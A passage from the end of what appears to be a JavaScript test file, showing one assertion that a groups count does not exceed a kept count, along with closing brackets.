    expect(r.groups).not.toBeGreaterThan(r.kept); // cap was never the cause
  });
});
